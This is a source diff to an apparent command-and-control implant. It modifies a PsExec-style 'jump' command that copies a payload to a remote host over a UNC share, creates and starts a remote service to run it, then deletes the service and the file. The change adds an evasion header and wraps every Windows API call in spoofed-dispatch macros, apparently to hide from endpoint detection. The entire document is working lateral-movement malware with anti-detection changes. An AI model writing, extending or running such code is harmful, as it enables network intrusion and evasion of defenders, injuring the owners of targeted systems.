@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_JUMP_PSEXEC
 
@@ -70,10 +71,10 @@ auto declfn starburst::cmd_jump_psexec(
 
     // wide UNC for cleanup
     wchar_t w_unc_del[512] = {};
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, unc_path, uidx, w_unc_del, 511 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, unc_path, uidx, w_unc_del, 511 );
 
     // stage payload to UNC path
-    HANDLE h_file = inst.kernel32.CreateFileA(
+    HANDLE h_file = (HANDLE)SCALL( inst, kernel32.CreateFileA,
         unc_path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr );
     if ( h_file == INVALID_HANDLE_VALUE ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -82,11 +83,11 @@ auto declfn starburst::cmd_jump_psexec(
     }
 
     DWORD written = 0;
-    BOOL write_ok = inst.kernel32.WriteFile( h_file, payload_data, payload_len, &written, nullptr );
-    inst.kernel32.CloseHandle( h_file );
+    BOOL write_ok = (BOOL)SCALL( inst, kernel32.WriteFile, h_file, payload_data, payload_len, &written, nullptr );
+    SCALL( inst, kernel32.CloseHandle, h_file );
 
     if ( !write_ok || written != payload_len ) {
-        inst.kernel32.DeleteFileW( w_unc_del );
+        SCALL( inst, kernel32.DeleteFileW, w_unc_del );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to write payload to remote host" ) ) );
         return;
@@ -94,9 +95,9 @@ auto declfn starburst::cmd_jump_psexec(
 
     // resolve SCM APIs
     STK_ADVAPI32(_n);
-    HMODULE h_advapi = inst.kernel32.LoadLibraryA( _n );
+    HMODULE h_advapi = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
     if ( !h_advapi ) {
-        inst.kernel32.DeleteFileW( w_unc_del );
+        SCALL( inst, kernel32.DeleteFileW, w_unc_del );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to load advapi32" ) ) );
         return;
@@ -120,34 +121,34 @@ auto declfn starburst::cmd_jump_psexec(
 
     if ( !pOpenSCManagerW || !pCreateServiceW || !pStartServiceW ||
          !pDeleteService || !pCloseServiceHandle ) {
-        inst.kernel32.DeleteFileW( w_unc_del );
+        SCALL( inst, kernel32.DeleteFileW, w_unc_del );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to resolve SC APIs" ) ) );
         return;
     }
 
     wchar_t w_host[256] = {};
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_str, host_len, w_host, 255 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, host_str, host_len, w_host, 255 );
 
     wchar_t w_svc[128] = {};
     if ( svc_name && svc_name_len > 0 ) {
-        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, svc_name, svc_name_len, w_svc, 127 );
+        SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, svc_name, svc_name_len, w_svc, 127 );
     } else {
         wchar_t def[] = { 'S','t','a','r','S','v','c', 0 };
         for ( int i = 0; i < 8; i++ ) w_svc[i] = def[i];
     }
 
     wchar_t w_bin[512] = {};
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, exec_path, eidx, w_bin, 511 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, exec_path, eidx, w_bin, 511 );
 
     wchar_t unc_host[270] = { '\\', '\\', 0 };
     for ( int i = 0; i < 256 && w_host[i]; i++ )
         unc_host[i + 2] = w_host[i];
 
-    SC_HANDLE h_scm = pOpenSCManagerW( unc_host, nullptr,
+    SC_HANDLE h_scm = (SC_HANDLE)SCALL_PTR( inst, pOpenSCManagerW, unc_host, nullptr,
         SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT );
     if ( !h_scm ) {
-        inst.kernel32.DeleteFileW( w_unc_del );
+        SCALL( inst, kernel32.DeleteFileW, w_unc_del );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "OpenSCManager failed - check perms/network" ) ) );
         return;
@@ -164,27 +165,27 @@ auto declfn starburst::cmd_jump_psexec(
     );
 
     if ( !h_svc ) {
-        pCloseServiceHandle( h_scm );
-        inst.kernel32.DeleteFileW( w_unc_del );
+        SCALL_PTR( inst, pCloseServiceHandle, h_scm );
+        SCALL( inst, kernel32.DeleteFileW, w_unc_del );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CreateService failed" ) ) );
         return;
     }
 
-    BOOL started = pStartServiceW( h_svc, 0, nullptr );
+    BOOL started = (BOOL)SCALL_PTR( inst, pStartServiceW, h_svc, 0, nullptr );
 
-    pDeleteService( h_svc );
-    pCloseServiceHandle( h_svc );
-    pCloseServiceHandle( h_scm );
+    SCALL_PTR( inst, pDeleteService, h_svc );
+    SCALL_PTR( inst, pCloseServiceHandle, h_svc );
+    SCALL_PTR( inst, pCloseServiceHandle, h_scm );
 
     // cleanup staged file
-    inst.kernel32.DeleteFileW( w_unc_del );
+    SCALL( inst, kernel32.DeleteFileW, w_unc_del );
 
     if ( started ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
             symbol<char*>( const_cast<char*>( "payload staged and service executed successfully" ) ) );
     } else {
-        DWORD err = inst.kernel32.GetLastError();
+        DWORD err = (DWORD)SCALL( inst, kernel32.GetLastError );
         if ( err == 1053 ) {
             queue_response( inst, task_uuid, RESPONSE_SUCCESS,
                 symbol<char*>( const_cast<char*>( "payload staged, service started (timeout - normal for payloads)" ) ) );
